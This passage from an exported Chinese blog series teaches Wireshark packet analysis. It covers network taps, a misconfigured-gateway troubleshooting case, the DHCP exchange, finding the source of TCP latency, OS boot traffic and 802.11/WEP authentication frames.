<p>4、使用网络分流器：这种方式在不需要考虑主机暂时下线带来的后果时适用。或者在需要嗅探光纤通信时，这是唯一的选择。由于网络分流器就是为了网络监听嗅探而设计的，而且能够跟上现代网络速度，因此这种方法比起集线器输出要更加高效。但是如果预算紧张，那么这种方式的成本会比较高昂。</p>
<p>5、直接安装：这种方式并没有在上图中表现出来。它是指仅仅在单个系统上安装嗅探器软件并监听这台系统的进出流量。这种方式一般是不建议采用的，因为如果一台主机存在故障和问题，这个问题就可能会导致数重要据包被丢弃，于是就无法表现出网络的原始面貌了。但是在进行环境测试、评估和性能审查，或者是检查在其他地方捕获的数据包文件时，这就是最佳方案。  </p>
<p>##网络情景与监听方式<br>在我们这次的场景中，出现的问题是用户不能访问Internet。现在可以确定的是，该用户可以访问所有的内网资源，包括其他工作站的共享内容，以及运行在本地服务器上的应用程序。</p>
<p>这个网络的构架也非常简单，所有客户机和服务器都连接到一系列的简单交换机上。Internet连接由一个路由器处理，作为默认网关。IP地址信息由DHCP提供。其实这是小型办公室的常见配置。</p>
<p>那么为了找出问题的原因，我们可以一边用嗅探器监听线路，一边让用户尝试浏览Internet。并且根据上图来决定放置嗅探器的最佳方法。在这里，网络上的交换机不支持端口镜像，假设客户可以暂时下线，那么使用网络分流器就是最佳的选择了。从而得到捕获文件Lab25-1.pcap。  </p>
<p>这里给大家稍微介绍一下网络分流器。网络分流器（Network probe）是一个独立的专门用于网络分析的硬件设备，它不会对已有网络设备的负载带来任何影响，这与端口镜像等方式相比具有极大的优势。可以将它放置在网络布线系统的两个端点之间，来捕获这两个端点之间的数据包。网络分流器一般有两种：聚合的和非聚合的网络分流器。两种分流器的配置如下：<br>1、聚合的网络分流器</p>
<p>聚合的网络分流器的使用方法是最简单的，它只有一个物理的流量监听口，来对双向通信进行嗅探。为了使用聚合的网络分流器来截获一台接入交换机的电脑的网络流量，需要如下进行配置：<br><img src="/2017/03/28/因配置错误而导致的网络故障/2.jpg" alt="2"><br>（1）从交换机上拔下目标计算机的网线。 （2）将连接目标计算机网线的另一端插入网络分流器的in端口中。 （3）将另一根网线的一段插入到网络分流器的out端口，并将另一端插入到网络交换机。 （4）将最后一根网线的一端插入网络分流器的monitor端口，并将另一端插入到作为嗅探器所使用的电脑上。 一旦连接好以后，嗅探器就可以捕获到接入网络分流器的所有网络流量了。<br>2、非聚合的网络分流器<br>非聚合的网络分流器比聚合的稍微复杂一些，它在进行流量的捕获时也有着更好的灵活性。与聚合网络分流器只有一个监听端口来嗅探双向通信流量所不同的是，非聚合的网络分流器有两个监听端口。一个监听端口是用来嗅探流出方向的网络流量（从电脑到分流器的端口方向），另一个监听端口是用来嗅探流入方向的网络流量（从分流器端口到电脑的方向）。 为了捕获一台连接交换机的电脑的所有流入流出的网络流量，需要进行如下配置：<br><img src="/2017/03/28/因配置错误而导致的网络故障/3.jpg" alt="3"><br>（1）从交换机上拔下电脑连接网线。 （2）将电脑连接网线的另一端插入到网络分流器的in端口上。 （3）将另一根网线的一端插入到网络分流器的out端口，然后将另一端插入到网络交换机上。 （4）将第三根网线插入到网络分流器的Monitor A端口，并将另一端插入到作为嗅探器使用的电脑的一块网卡接口上。 （5）将最后一根网线插入到网络分流器的Monitor B端口，并将另一端插入到作为嗅探器使用的电脑的第二块网卡接口上。  </p>
<p>##数据包分析<br>这里我们分析一下所捕获的数据包：<br><img src="/2017/03/28/因配置错误而导致的网络故障/4.jpg" alt="4"><br>可以看到，捕获文件从ARP的请求与响应作为开始。用户计算机的MAC地址是00:25:b3:bf:91:ee，IP地址是172.16.0.8。在1号数据包中，用户计算机发送了一个ARP广播数据包给网络上的所有计算机。想要获取默认网关172.16.0.10的MAC地址。</p>
<p>根据2号数据包中收到的响应，用户计算机知道了172.16.0.10的MAC地址是00:24:81:a1:f6:79。收到这个响应之后，计算机就有了到达网关的路由，而网关应该可以引导它接入Internet。</p>
<p>在ARP响应之后，计算机会在3号数据包中请求将网站的域名解析为IP地址：<br><img src="/2017/03/28/因配置错误而导致的网络故障/5.jpg" alt="5"><br>如上图所示，计算机发送一个DNS查询数据包到它的首选DNS服务器4.2.2.2。正常情况下，DNS服务器会很快响应DNS查询，但是在这个例子中并非如此。我们并没有看到任何的响应，却发现了同样的DNS查询再次发送到不同的目的地址。比如4号数据包发送到了4.2.2.1，这是预先配置好的备用DNS服务器。</p>
<p>由于计算机仍然没有从DNS服务器收到响应，于是1秒之后，计算机又利用5号数据包再次发出DNS查询到4.2.2.2。接下来由于依旧没有得到响应，于是这个过程不断重复，交替向配置好的首选DNS服务器和备用DNS服务器发送请求。整个过程大概持续了8秒，其实这正是用户的Internet浏览器报告该页无法访问之前所花费的时间。</p>
<p>基于这些所捕获到的数据包，我们就可以开始查明问题的根源了。首先，我们看到一个ARP请求成功地抵达网络上我们认为的默认网关，所以我们知道网关设备在线并且可以连接。我们也知道用户的计算机确实可以在网络上传输数据包，所以我们可以假设本机的协议栈没有问题。那么显然问题就出在与DNS请求相关的设备上。</p>
<p>就这个网络来说，DNS请求是由Internet上的外部服务器（4.2.2.2或4.2.2.1）解析的。这就说明了，想要顺利解析的话，负责将数据包路由到Internet的路由器必须成功将DNS查询转发到服务器，而且服务器必须响应。否则，就无法使用HTTP请求Web页面。</p>
<p>我们知道其他用户上网都没有问题，这就告诉我们网络路由器和远程DNS服务器也许不是问题的原因所在。剩下的唯一可能就是用户自己的计算机出现了问题。</p>
<p>那么在进一步检查这台故障的计算机后，我们发现它不接受DHCP分配的地址，而是手动配置了地址信息，并且默认网关地址设置错了。被设置为默认网关的地址并不是一台路由器，所以它并不能够将DNS查询数据包转发到网络之外。  </p>
<p>##总结<br>在我们这次的情景中，问题出自一台配置错误的客户端。虽然这个问题并不复杂，但是它却严重影响了用户。如果缺乏必要的网络知识或者相应的网络排错技术，那么排除这种配置错误将会花费大量的时间。可以看到，数据包分析也适用于小型的网络环境。</p>
<p>我们并不知道网络上默认网关的IP地址，Wireshark也不能准确地识别出故障的原因，但是它却可以告诉我们应该去哪里查找故障，这样就节省了很多的时间。其实网络出现问题经常是因为这些简单的配置错误，通过数据包的分析，通常能够快速地解决。特别是在一些配置情况非常复杂的时候，就更能够凸显Wireshark的价值了。  </p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 排错篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[容易被忽视的DHCP协议]]></title>
        <url>https://517736522.github.io/2017/03/28/%E5%AE%B9%E6%98%93%E8%A2%AB%E5%BF%BD%E8%A7%86%E7%9A%84DHCP%E5%8D%8F%E8%AE%AE/</url>
        <content type="html"><![CDATA[<p>##DHCP的工作原理<br>DHCP的前身是BOOTP协议（Bootstrap Protocol），属于TCP/IP的应用层协议。BOOTP协议当初被创建出来给连接到网络的设备自动分配地址。直到后来才被更加复杂而完善的DHCP协议所取代。DHCP在网络配置方面非常重要，特别是当一个网络的规模较大时，使用DHCP可以极大地减轻网络管理员的工作量。另外，对于移动设备来说，由于使用的环境会经常改变，那么它所处的网络IP地址也就可能随时变动。如果每次都需要通过手工修改来设置它们的IP地址，使用起来就会非常麻烦。那么此时，就可以使用DHCP来减轻负担。这里我们通过下图来分析一下DHCP的工作流程：<br><img src="/2017/03/28/容易被忽视的DHCP协议/1.jpg" alt="1"><br>在使用DHCP的时候，网络上首先必须有一台DHCP服务器，而其它计算机则是DHCP的客户端。整个DHCP的工作过程分为4个阶段，即发现阶段（Discover）、提供阶段（offer）、请求阶段（request）以及确认阶段（ACK）。这里分别简单介绍一下上述四种数据包的类型：<br>1、DHCP Discover</p>
<p>DHCP客户端请求地址时，并不知道DHCP服务器的位置，因此DHCP客户端会在本地网络内以广播的形式发送请求数据包。这个数据包就被称作Discover数据包，目的是发现网络中的DHCP服务器。所有收到Discover数据包的DHCP服务器都会发送响应数据包，那么客户端就可以知道网络中存在的DHCP服务器的位置。<br>2、DHCP offer</p>
<p>当DHCP服务器收到Discover数据包后，就会在所配置的地址池中寻找一个合适的IP地址，加上相应的租约期限和其它配置信息（如网关、DNS服务器等），构造一个offer数据包，发送给客户端，告知客户端本服务器可以为其提供IP地址。<br>3、DHCP Request</p>
<p>DHCP客户端可能会收到很多的offer，所以必须要从中选择一个。一般来说，客户端会选择第一个回应的offer数据包服务器作为自己的目标服务器，并回应一个广播Request数据包，以告诉所有的服务器，自己已经做出了选择。当DHCP客户端成功获取IP地址后，在地址使用租期过去一半的时候，会向DHCP服务器发送单播Request数据包，用于延续租期。如果没有收到DHCP ACK数据包，那么在租期过去四分之三时，会发送广播Request数据包来延续租期。<br>4、DHCP ACK</p>
<p>DHCP服务器收到Request数据包后，根据Request数据包中携带的用户MAC地址来查找有没有相应的租约记录，如果有则发送ACK数据包作为回应，通知用户可以使用分配的IP地址。  </p>
<p>##DHCP数据包的捕获<br>为了捕获到DHCP数据包，这里我在虚拟机的环境下，首先打开Wireshark，在捕获选项中，设置筛选条件为UDP，因为DHCP是使用UDP协议工作的。之后开启Wireshark的捕获。现在我们需要让系统产生DHCP的数据包，由于DHCP只有当主机的IP地址过期或者重新启动系统时，才会重新请求IP地址。否则是不能够产生DHCP数据包的。那么我们可以通过重新启动网卡的方法，进行数据包的捕获。</p>
<p>这里我们打开命令提示符，使用ipconfig的release以及renew参数来释放并重新获取地址信息：<br><img src="/2017/03/28/容易被忽视的DHCP协议/2.jpg" alt="2"><br>此时我们在Wireshark中就可以获取DHCP数据包了。  </p>
<p>##DHCP数据包的分析<br>我们打开刚刚捕获的文件（Lab12-1.pcapng），由于在捕获的文件中还存在有其它的数据包，因此这里我们可以加入一个筛选条件bootp，那么此时剩下的就全都是DHCP协议的数据包了：<br><img src="/2017/03/28/容易被忽视的DHCP协议/3.jpg" alt="3"><br>在这里我们可以看到DHCP的释放、发现、提供、请求和确认数据包。这里我们分别进行分析。<br>1、释放数据包</p>
<p>捕获文件的第一个数据包就是释放数据包。当用户不再需要使用分配的IP地址时，就会向DHCP服务器发送 Release数据包，告知服务器，用户已经不再需要分配的IP地址，DHCP服务器就会释放掉被绑定的租约。<br>2、发现数据包</p>
<p>我们再看一下第二个数据包。它是从0.0.0.0的68号端口发往255.255.255.255的67号端口。客户端使用0.0.0.0，是因为它目前还没有IP地址。数据包被发往255.255.255.255，是因为这是一个独立于网络的广播地址，这就能够确保这个数据包会被发送到网络中的所有设备上。因为客户端并不知道DHCP服务器的地址，所以这么做就一定可以找到正在监听的DHCP服务器。</p>
<p>接下来我们可以看到DHCP是基于UDP作为其传输协议的，因为DHCP客户端对请求响应速度有很高的要求。而DHCP有其内置的保证可靠性的方法，也就意味着UDP是最适合的协议。需要说明的是，由于Wireshark在处理DHCP时，仍然会引用BOOTP，所以我们会在Packet Details面板中看到Bootstrap Protocol，而不是DHCP：<br><img src="/2017/03/28/容易被忽视的DHCP协议/4.jpg" alt="4"><br>这是一个请求数据包，因为在消息类型（Message type）中被标记为1。在这个发现数据包中，还可以看到很多为空的IP地址域。另外还需要我们注意的是选项中的内容，它用来对DHCP数据包进行扩展，以提供更多的功能。这里比较重要的有：</p>
<p>DHCP消息类型（DHCP Message Type）：这个选项是一个长度和值均为1的53类型。表明它是一个发现数据包。</p>
<p>客户端标识符（Client identifier）：这里提供了客户端请求IP地址的额外信息。</p>
<p>所请求的IP地址（Requested IP Address）：这里提供了客户端希望得到的IP地址（通常是之前用过的IP地址）。</p>
<p>请求参数列表（Parameter Request List）：这里列出了客户端希望从DHCP服务器接收到的不同配置项（其它重要网络设备的IP地址）。<br>3、提供数据包</p>
<p>捕获文件的第三个数据包就是提供数据包。可以看到这个数据包是从192.168.147.254发往192.168.147.129的。尽管目标地址是192.168.147.129，也就是客户端的地址，但事实上，客户端还没有这个地址，所以服务器会首先尝试使用由ARP提供的客户端硬件地址与之通信。如果通信失败，那么它将会直接把提供数据包广播出去，以进行通信。</p>
<p>这里我们看一下它的DHCP部分，它被称为提供数据包，说明这是一个用于响应的消息类型。这个数据包包含了和前一个数据包相同的事务ID，通过这个IP就可以知道这个响应与我们原先的请求相对应。</p>
<p>这个提供数据包由DHCP服务器发出，用于向客户端提供服务。它提供了关于它自己的信息，以及给客户端提供的地址。如下图所示：<br><img src="/2017/03/28/容易被忽视的DHCP协议/5.jpg" alt="5"><br>在Your(client)IP address中，地址192.168.147.129就是要提供给客户端的地址。而Next server IP address中的192.168.147.254表明我们的DHCP服务器与默认网关共享一个IP地址。</p>
<p>下面列出的第一个选项说明这个数据包是一个DHCP的提供数据包。选项中还需要我们关注的内容有：</p>
<p>IP地址租约时间（IP Address Lease Time）是30分钟。</p>
<p>子网掩码（Subnet Mask）是255.255.255.0。</p>
<p>路由器（Router）地址为192.168.147.2。<br>4、请求数据包</p>
<p>在客户端接收到DHCP服务器的提供数据后，它将会以一个DHCP请求数据包作为接收确认：<br><img src="/2017/03/28/容易被忽视的DHCP协议/6.jpg" alt="6"><br>这个数据包仍然从IP地址为0.0.0.0处发出，毕竟我们还没有完成获取IP地址的过程，但是数据包现在知道了DHCP服务器的存在。可以发现，这是一个请求数据包。这个数据包与发现数据包相似，其所有的IP地址信息都是空的。在最后的选项域中，我们看到这是一个DHCP请求。<br>5、确认数据包</p>
<p>整个过程的最后一步就是DHCP在确认数据包中给客户端发送其所请求的IP地址，并在数据库中记录相关信息。那么此时客户端就有了一个IP地址，就可以使用它在网络上通信了。<br>DHCP租约内续租</p>
<p>当DHCP给一台设备分配了一个IP地址时，它同时给客户端定下了一个租约。这就表示着，客户端只能够在有限的时间内使用这个IP地址，到了时间就一定要续租。我们刚才介绍的DHCP数据包的分析过程是出现在客户端第一次获取IP地址或者其租约时间已经过期的情况下，这两种情况就会被视为租约过期。</p>
<p>当一个拥有IP地址的客户端在租约内重新启动，它必须经过一次精简版的DHCP数据包传输过程来重新认领它的IP地址。这个过程就被称为租约内续租。</p>
<p>在租约内续租的时候，发现和提供数据包就变得没有必要了，只需要完成请求和确认两个步骤就可以了。关于这点，我们可以通过实验文件Lab12-2.pcap进行分析：<br><img src="/2017/03/28/容易被忽视的DHCP协议/7.jpg" alt="7">  </p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 协议篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[捕获高延迟的罪魁祸首]]></title>
        <url>https://517736522.github.io/2017/03/28/%E6%8D%95%E8%8E%B7%E9%AB%98%E5%BB%B6%E8%BF%9F%E7%9A%84%E7%BD%AA%E9%AD%81%E7%A5%B8%E9%A6%96/</url>
        <content type="html"><![CDATA[<p>##定位高延迟出现的基本原理<br>研究基于TCP的延迟问题，最有效的方法之一是查看初始连接握手以及接下来的两个数据包。举个例子来说，客户端和Web服务器之间是一个简单连接，客户端尝试浏览托管在服务器上的一个站点。需要我们关注的是通信序列里面的前六个数据包，这里面包括TCP的三次握手、初始的HTTP GET请求、对这个GET请求的确认，以及从服务器发往客户端的第一个数据包的情况。  </p>
<p>##通信正常的情况<br>我们首先分析一个正常通信的情况，之后就可以将它与存在着高延迟的情况做比较。可以查看一下实验文件Lab31-1.pcap：<br><img src="/2017/03/28/捕获高延迟的罪魁祸首/1.jpg" alt="1"><br>对于这个捕获文件，关于TCP握手以及HTTP通信的细节就不再讨论。在本次的课程中，我们不需要再查看Packet Details面板，只需要关心Time列的情况即可。可以看到，这个正常的通信序列是非常快的，整个过程花费了0.1秒左右。那么接下来我们所分析的实验文件也是具有类似的模式，只是在一些细节上有所不同。  </p>
<p>##由线路延迟导致的慢速通信<br>现在我们看一下实验文件Lab31-2.pcap的情况：<br><img src="/2017/03/28/捕获高延迟的罪魁祸首/2.jpg" alt="2"><br>可以看到，这个捕获文件中，除了时间值以外，所有的数据包都和上一个文件中的情况一致。具体来查看一下，很快就遇到了第一个延迟的标志。客户端（172.16.16.128）发送了初始的SYN数据包，开始了TCP的握手。在收到服务器端（74.125.95.104）返回的SYN/ACK数据包之前，出现了大约0.87秒的延迟，其实这就是我们受到线路影响的第一个迹象，这是客户端与服务器之间的设备导致的。</p>
<p>由于数据包传输的特性，我们可以确定这就是线路延迟的问题。因为当服务器收到一个SYN数据包时，由于不涉及任何传输层以上的处理，发送一个响应只需要非常小的处理量。即使服务器正在承受着巨大的流量负载，它也会迅速地向SYN数据包响应一个SYN/ACK数据包。于是这就排除了由服务器导致的高延迟的可能性。</p>
<p>客户端存在延迟的可能性也可以排除。因为它在此时除了接收SYN/ACK数据包以外什么都没干。</p>
<p>接着往下看，我们发现完成三次握手的ACK数据包传输得很快，客户端发送的HTTP GET请求也同样如此。产生这两个数据包的处理过程是收到SYN/ACK后在客户端本地发生的，所以只要客户端没有沉重的处理负载，这两个数据包应该立刻就可以发送出去。</p>
<p>在5号数据包，我们又发现了较高的时间值延迟。我们在发送了HTTP GET请求之后，经过了大概1.1秒才收到从服务器返回的ACK数据包。在收到HTTP GET请求后，服务器在发送数据之前，先发送了一个TCP ACK，同样这也不需要服务器耗费太多的处理资源。那么这就是线路延迟的另一个标志。</p>
<p>每到遇上线路延迟，我们几乎都会在通信过程中初始握手的SYN/ACK以及其它ACK数据包中看到类似于这样的场景。虽然这个信息并没有告诉我们网络高延迟的确切原因，但是它起码告诉我们不是客户端或者服务器的问题，所以我们就能够意识到延迟是因为中间的一些设备出了问题。此时，就可以开始检查受影响主机之间的防火墙、路由器、代理服务器等设备，从而确定问题所在。  </p>
<p>##由客户端延迟导致的慢速通信<br>下面我们分析一下实验文件Lab31-3.pcap：<br><img src="/2017/03/28/捕获高延迟的罪魁祸首/3.jpg" alt="3"><br>刚开始的数据包都很正常，迅速完成了TCP的三次握手操作，没有任何延迟。但是在握手完成之后，4号数据包的HTTP GET请求出现了问题，这个数据包距离上一个数据包出现了1.34秒的延迟。</p>
<p>我们需要分析一下3号数据包和4号数据包之间到底发生了什么，从而找到延迟出现的原因。3号数据包是TCP三次握手过程中，由客户端发往服务器的最后一个ACK数据包，4号数据包则是客户端发往服务器的GET请求。二者的共同点在于都是由客户端发送的，与服务器无关。而在发送完ACK之后，本应该很快就发送GET请求，因为所有的动作都是以客户端为中心的。</p>
<p>但是，ACK并没有快速切换到GET。创建和传输GET数据包确实需要应用层的处理，而处理过程的延迟表明客户端无法及时执行该操作，这就意味着通信高延迟的根源在客户端。  </p>
<p>##由服务器延迟导致的慢速通信<br>这里我们研究一下最后一个实验文件Lab31-4.pcap：<br><img src="/2017/03/28/捕获高延迟的罪魁祸首/4.jpg" alt="4"><br>在这个捕获记录中，两台主机之间的TCP握手过程很快就顺利完成，这是个很好的开端。下一对数据包也属于正常的情况，初始的GET请求和响应的ACK数据包也很快就传输完毕了。直到最后一个数据包，我们才发现了高延迟的现象， 6号数据包是服务器响应客户端GET请求的第一个HTTP数据包，但是它竟然在服务器为GET请求发送TCP ACK之后延迟了将近1秒。5号数据包和6号数据包的切换情况和我们在上一个情景中所看到的握手ACK和GET请求之间的切换很相似。然而，这个例子中，服务器才是我们关注的重点。</p>
<p>5号数据包是服务器响应客户端GET请求的ACK。一旦发送这个数据包，服务器就应该立刻开始发送数据，这个数据包中的数据访问、打包、传输是由HTTP协议完成的，由于这是一个应用层的协议，需要服务器做一些处理。延迟收到这个数据包就表明了服务器不能够及时处理这个数据，于是就把延迟的根源指向了服务器。  </p>
<p>##延迟定位框架<br>经过上述分析可见，我们使用6个数据包就成功地定位了从客户端到服务器的网络高延迟的原因。这些场景看起来也许有些复杂，但是我们可以通过下图来更快地解决延迟问题，并且这个原则几乎可以应用于任何基于TCP的通信：<br><img src="/2017/03/28/捕获高延迟的罪魁祸首/5.jpg" alt="5"><br>我们的讨论都是针对于TCP协议的，并没有讨论UDP的延迟。这是因为UDP的设计目标是速度优先，并不是以可靠性优先，所以它并没有内置任何延迟检测并从中恢复的功能。相反，它需要依赖于应用层协议来解决数据的可靠传输的问题。  </p>
<p>##小结  </p>
<p>至此，《网络数据包分析从入门到精通》系列课程的排错篇就讲解完了。其实排错的思想就是基于我们之前的协议篇所讲的内容。当然我在这里所讲解的排错知识，不过是冰山一角，更多的东西是需要大家自己去摸索去研究的，也希望这几节课的内容能够给大家以启发。  </p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 安全篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[操作系统启动数据包解析]]></title>
        <url>https://517736522.github.io/2017/03/28/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%E6%95%B0%E6%8D%AE%E5%8C%85%E8%A7%A3%E6%9E%90/</url>
        <content type="html"><![CDATA[<p>##WinXP启动数据包的捕获<br>为了能够捕获到其它操作系统的数据包，这里我需要使用VMWare这款虚拟机软件。我已经在这个虚拟机中安装了Windows XP SP3操作系统。那么我们就可以在Wireshark的捕获选项中的捕获对象中找到VMWare选项，我们勾选这个选项：<br><img src="/2017/03/28/操作系统启动数据包解析/1.jpg" alt="1"><br>然后开始捕获并打开虚拟机，等系统彻底启动完毕之后，就可以抓取到非常多的数据包了（Lab22-1.pcapng）：<br><img src="/2017/03/28/操作系统启动数据包解析/2.jpg" alt="2">  </p>
<p>##数据包的分析<br>我们这次所捕获到的数据包非常大，其中可以发现非常多的TCP与DNS协议。这是因为我的这个虚拟系统中设置了开机启动项，也就是有些软件会在开机时自启动，并进行一些联网的操作。如果说不让这些软件启动，那么就不会出现这么多的TCP和DNS了。所以这里为了方便分析，我这里首先使用筛选器筛选掉TCP和DNS：<br><img src="/2017/03/28/操作系统启动数据包解析/3.jpg" alt="3"><br>可以看到，在所捕获的数据包中有非常多的NBNS数据包。NBNS协议指的是网络基本输入/输出系统（NetBIOS）名称服务器。NBNS协议是TCP/IP上的NetBIOS协议族的一部分，它在基于NetBIOS名称访问的网络上提供主机名和地址映射的方法。</p>
<p>NetBIOS协议是由IBM公司开发，主要用于数十台计算机的小型局域网。该协议使得在局域网上的程序可以使用应用程序编程接口（API），为程序提供了请求低级服务的统一命令集，作用是为局域网提供网络以及其他特殊功能。系统可以利用WINS服务（Windows网络名称服务）、广播以及Lmhost（LAN Manager Hosts）文件等多种模式将NetBIOS名（指基于NetBIOS协议获得计算机名称）解析为相应的IP地址，以实现通信。所以，在局域网内部使用NetBIOS协议可以方便地实现消息通信及资源的共享。因为它占用系统资源少，传输效率高，所以几乎所有的局域网都是在NetBIOS协议的基础上工作的。</p>
<p>在Windows系统中，NetBIOS协议默认是开启的。所以将使用NBNS协议广播自己的主机名和工作组信息，以访问网络中的共享资源。从获取的数据包中可以看到，系统的主机名称是JIANG-1A3C6C581，所处的环境为工作组WORKGROUP。</p>
<p>第17和18号数据包使用了DHCP协议来获取IPv4的地址。2606和2625号数据包是请求加入组播组的数据包。因为加入了组播组之后可以识别并接收以该IP组播地址为目的地址的IP报文。通过组播传输数据，可以提高数据传输效率，并减少了网络出现拥塞的可能性。</p>
<p>接下来我们还可以看到ARP数据包。由于当前主机需要访问网络中的资源，所以必须通过路由器转发获取。由于系统刚刚启动，还没有记录任何主机的ARP条目，所以这里需要使用ARP协议请求获取到路由器（网关）的MAC地址，然后才可以连接到网络。如果包含有共享资源，那么还可以看到诸如SMB这样的协议。</p>
<p>下面我们取消筛选条件，来关注一下TCP以及DNS协议的情况。由于我的系统中安装了迅雷，并且设置了开机自启动，所以可以看到数据包中有关于迅雷的内容。比如56号数据包：<br><img src="/2017/03/28/操作系统启动数据包解析/4.jpg" alt="4"><br>在迅雷的数据包下面，还有kankan.com以及sandai.net，其实这都是迅雷的相关产品。并且通过抓包还可以清晰地看到，迅雷在开机启动时的网络特征，比如连接了哪些服务器，又启动了哪些我们平时注意不到的网络服务等。那么这里就不再赘述，大家有兴趣的话也可以查看一下有没有关于迅雷的其它数据包。  </p>
<p>##Kali Linux启动数据包分析<br>我们在之前的课程中曾经对比分析过CIFS协议在WinXP以及Win7中的不同。其实通过这种对比分析的方式，更有助于我们理解协议的执行过程。特别是在运用了Wireshark这款工具的情况下，不同操作系统的特性也是一目了然。那么我们这次，也可以对比分析不同操作系统启动过程中的不同。那么这里对比的就是WinXP以及Kali Linux之间的不同。</p>
<p>数据包的捕获方式与WinXP是一致的，我的Kali Linux是1.0.7版本。所捕获到的数据包是Lab22-2.pcapng，下面可以利用Wireshark来简单分析一下：<br><img src="/2017/03/28/操作系统启动数据包解析/5.jpg" alt="5"><br>由于并没有开机自启动程序，因此这个捕获文件明显没有刚才的那么大，也就少了非常多的TCP以及DNS数据包。可以看到，捕获文件的一开始出现了很多ICMPv6数据包，这是客户端请求获取IPv6地址的相关数据包。但是我们在分析刚才的捕获文件中，并没有看到这个数据包，这是因为WinXP默认是不支持IPv6的，而Kali Linux是支持的。想要在WinXP上使用IPv6很简单，可以打开cmd输入“ipv6 install”即可。</p>
<p>接下来还有ARP和DHCP数据包，这与WinXP的情况是一致的。另外，在刚才的捕获文件中发现了许多NBNS协议，因为Windows系统是默认开启了这个功能。但是在Kali Linux中我们并没有发现，可以认为这个协议并没有默认开启或者说它并不是Linux系统启动所必需的协议。</p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 协议篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[无线网络数据包初探实验]]></title>
        <url>https://517736522.github.io/2017/03/28/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%9D%E6%8E%A2%E5%AE%9E%E9%AA%8C/</url>
        <content type="html"><![CDATA[<p>##802.11数据包的结构<br>这里我们结合实验文件Lab24-1.pcap进行讲解：<br><img src="/2017/03/28/无线网络数据包初探实验/1.jpg" alt="1"><br>无线网络数据包与有线网络数据包最大的不同在于额外的802.11头部。这是一个位于第二层的头部，包含与数据包和传输介质有关的额外信息。802.11数据包一共有三种类型：</p>
<p>管理：这类数据包用于在主机之间建立第二层的连接。管理数据包还有一些重要的子类型，包括认证（authentication）、关联（association）和信号（beacon）数据包。而我们现在所研究的就是信号数据包。</p>
<p>数据：这类数据包包含有真正的数据，也是唯一可以从无线网络转发到有线网络的数据包。</p>
<p>控制：控制数据包允许管理数据包和数据数据包的发送，并与拥塞管理有关。常见的子类型包括请求发送（request-to-send）和准予发送（clear-to-send）数据包。</p>
<p>一个无线数据包的类型和子类型决定了它的结构，因此各种可能的数据包结构不计其数。我们现在研究的beacon管理数据包是最有信息量的无线数据包之一。它作为一个广播数据包由WAP（Wireless Access Point，无线接入点）发送，穿过无线信道通知所有无线客户端存在这个可用的WAP，并定义了连接它必须设置的一些参数。比如上图中可以看到，这个数据包在802.11头部的Type/Subtype域被定义为beacon。</p>
<p>在802.11管理帧的头部也包含有其它的一些信息，主要有： Timestamp：发送数据包的时间戳。 Beacon Interval：Beacon数据包的重传间隔。 Capabilities Information：WAP的硬件容量信息。 SSID Parameter Set：WAP广播的SSID（网络名称）。 Supported Rates：WAP支持的数据传输率。 DS Parameter：WAP广播使用的信道。 这个头部也包含了来源和目的地址以及厂商信息。</p>
<p>这样我们就可以知道，在这个捕获文件中，显然是一台D-Link设备，使用802.11b标准，在信道11上工作。</p>
<p>虽然802.11管理数据包的具体内容和用途不太一样，但是总体结构和这个例子差别不大。  </p>
<p>##在Packet List面板增加无线专用列<br>Wireshark通常在Packet List面板中会显示7个不同的列。但是鉴于无线数据报的特殊性，我们需要在Packet List面板增加三个新的列。选择菜单栏的“Edit”-&gt;“Preferences”，选择左边的Columns，并点击Add。在Title域输入RSSI，并在域类型下拉列表中选择IEEE 802.11 RSSI。同理，再添加一个名为TX Rate，类型为IEEE 802.11 TX rate以及名为Channel/Frequency，类型为Channel/Frequency的列：<br><img src="/2017/03/28/无线网络数据包初探实验/2.jpg" alt="2"><br>新添加的每个列说明如下： RSSI（for Received Singnal Strength Indication）列，显示捕获数据包的射频信号强度。 TX Rate（for Transmission Rate）列，显示捕获数据包的数据率。 Channel/Frequency列，显示捕获数据包的频率和信道。</p>
<p>当处理无线连接时，这些提示信息将会非常有用。例如，即使你的无线客户端软件告诉你信号强度很棒，我们亲自捕获数据包并检查这些列，也许会得到与客户端软件告诉我们的结果不一样的数字。</p>
<p>接下来单击Apply和OK使设置生效即可。  </p>
<p>##WEP认证分析<br>部署和管理无线网络时最大的担忧就是数据传输的安全性。因为数据在空气中传播，任何人都可以得到它，因此数据的加密是至关重要的。最初推荐用在无线网络中加密传输数据的技术依据的是“有线等效加密”（Wired Equivalent Privacy，WEP）标准。WEP在最开始的时候很成功，直到后来被发现它在密钥管理方面存在几个漏洞。为了加强安全，几个新的标准又被设计出来。这就包括了无线上网保护接入（Wi-Fi Protected Access，WPA）和WPA2标准。尽管WPA和比它更安全的WPA2依旧不是十全十美，但是也比WEP强多了。那么下面我们就来分析一下WEP以及WPA的认证数据包。</p>
<p>我们先打开实验文件Lab24-2.pcap，这个捕获文件里面包含了成功连接WEP无线网络的例子。这个网络使用WEP安全机制。用户必须向无线网络接入点（WAP）提供一个密码，以通过认证并解密它发来的数据。这个WEP的密码可以当作无线网络的密码：<br><img src="/2017/03/28/无线网络数据包初探实验/3.jpg" alt="3"><br>在第4个数据包中，它是从无线网络接入点（00：11：88：6b：68：30）发送到无线客户端（00：14：a5：30：b0：af）的质询开始。这个质询的目的是确认无线客户端是否有正确的WEP密码。展开数据包头部中的Tagged parameters，就可以看到这个质询。</p>
